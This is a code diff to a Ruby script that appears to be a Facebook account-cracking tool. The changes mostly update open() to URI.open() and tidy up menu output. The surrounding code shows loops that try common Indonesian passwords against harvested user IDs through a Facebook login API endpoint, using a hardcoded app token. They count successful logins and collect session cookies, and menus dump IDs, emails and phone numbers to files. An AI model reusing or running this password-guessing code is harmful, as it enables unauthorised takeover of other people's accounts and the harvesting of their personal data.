@@ -119,6 +119,11 @@ def ReportBug()
   msg << "File Name : #{$0}\n"
   msg << "File Path : #{File.realpath($0)}\n"
   msg << "File Size : #{File.size($0)}\n"
+  msg << "\nRuby\n========\n"
+  msg << "Ruby Engine : #{RUBY_ENGINE}\n"
+  msg << "Ruby Version : #{RUBY_VERSION}\n"
+  msg << "Ruby Platform : #{RUBY_PLATFORM}\n"
+  msg << "Ruby Release Date : #{RUBY_RELEASE_DATE}\n"
   text = ERB::Util.url_encode(msg)
   system ("xdg-open https://wa.me/6285754629509?text=#{text}")
   abort ("#{$r}[!] Exit!")
@@ -516,7 +521,7 @@ def Mini()
     ["Sayang","Anjing","Kontol","Doraemon"].each {|i| password << i} if $indonesia
     for pass in password
       url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-      r = open(url,'User-Agent'=>$user_agent).read()
+      r = URI.open(url,'User-Agent'=>$user_agent).read()
       res = JSON.parse(r)
       if res.key? ('access_token')
         puts ("#{$g}[✓] Success")
@@ -784,7 +789,7 @@ def main(id)
         pw1 = ["Sayang","Anjing","Bangsat","Kontol","Doraemon"]
         for pass in pw1
           url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + i + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-          req = open(url,'User-Agent'=>$user_agent).read()
+          req = URI.open(url,'User-Agent'=>$user_agent).read()
           res = JSON.parse(req)
           if res.key? ('access_token')
             $ok += 1
@@ -858,7 +863,7 @@ def Brutal()
       begin
         url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
         puts ("#{$r}[+] #{$g}Login As #{$r}: #{$w}-> #{$g}#{id} #{$w}-> #{$g}#{pw}#{$a}")
-        req = open(url,'User-Agent'=>$user_agent).read()
+        req = URI.open(url,'User-Agent'=>$user_agent).read()
         res = JSON.parse(req)
         if res.key? ('access_token')
           puts ("#{$w}#{'═'*52}")
@@ -928,12 +933,12 @@ def GetMenu()
           puts ("#{$g}[✓] Id.  : #{i['id']}")
           puts ("#{$w}#{'═'*52}")
         end
-        puts ("#{$g}[✓] Total Id : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
       end
+      puts ("#{$g}[✓] Total Id : #{total}")
+      puts ("#{$g}[✓] File : #{File.basename(file)}")
+      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
+      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+      GetMenu()
     when '2'
       system ('clear')
       puts ($logo)
@@ -960,12 +965,12 @@ def GetMenu()
             puts ("#{$g}[✓] Id.  : #{i['id']}")
             puts ("#{$w}#{'═'*52}")
           end
-          puts ("#{$g}[✓] Total Id : #{total}")
-          puts ("#{$g}[✓] File : #{File.basename(file)}")
-          puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          GetMenu()
         end
+        puts ("#{$g}[✓] Total Id : #{total}")
+        puts ("#{$g}[✓] File : #{File.basename(file)}")
+        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        GetMenu()
       end
     when '3'
       system ('clear')
@@ -989,12 +994,12 @@ def GetMenu()
             puts ("#{$w}#{'═'*52}")
           end
         end
-        puts ("#{$g}[✓] Total email : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
       end
+      puts ("#{$g}[✓] Total email : #{total}")
+      puts ("#{$g}[✓] File : #{File.basename(file)}")
+      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
+      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+      GetMenu()
     when '4'
       system ('clear')
       puts ($logo)
@@ -1024,12 +1029,12 @@ def GetMenu()
               puts ("#{$w}#{'═'*52}")
             end
           end
-          puts ("#{$g}[✓] Total email : #{total}")
-          puts ("#{$g}[✓] File : #{File.basename(file)}")
-          puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          GetMenu()
         end
+        puts ("#{$g}[✓] Total email : #{total}")
+        puts ("#{$g}[✓] File : #{File.basename(file)}")
+        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        GetMenu()
       end
     when '5'
       system ('clear')
@@ -1053,12 +1058,12 @@ def GetMenu()
             puts ("#{$w}#{'═'*52}")
           end
         end
-        puts ("#{$g}[✓] Total phone : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      end    
+      end
+      puts ("#{$g}[✓] Total phone : #{total}")
+      puts ("#{$g}[✓] File : #{File.basename(file)}")
+      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
+      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+      GetMenu()
     when '6'
       system ('clear')
       puts ($logo)
@@ -1088,12 +1093,12 @@ def GetMenu()
               puts ("#{$w}#{'═'*52}")
             end
           end
-          puts ("#{$g}[✓] Total phone : #{total}")
-          puts ("#{$g}[✓] File : #{File.basename(file)}")
-          puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          GetMenu() 
         end
+        puts ("#{$g}[✓] Total phone : #{total}")
+        puts ("#{$g}[✓] File : #{File.basename(file)}")
+        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        GetMenu() 
       end
     when '0'
       Hamker()
@@ -2293,7 +2298,7 @@ def lain()
           email = sep.first
           pass = sep.last
           url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=#{email}&locale=en_US&password=#{pass}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
-          req = open(url,'User-Agent'=>$user_agent).read()
+          req = URI.open(url,'User-Agent'=>$user_agent).read()
           res = JSON.parse(req)
           if res.key? ('access_token')
             ok += 1
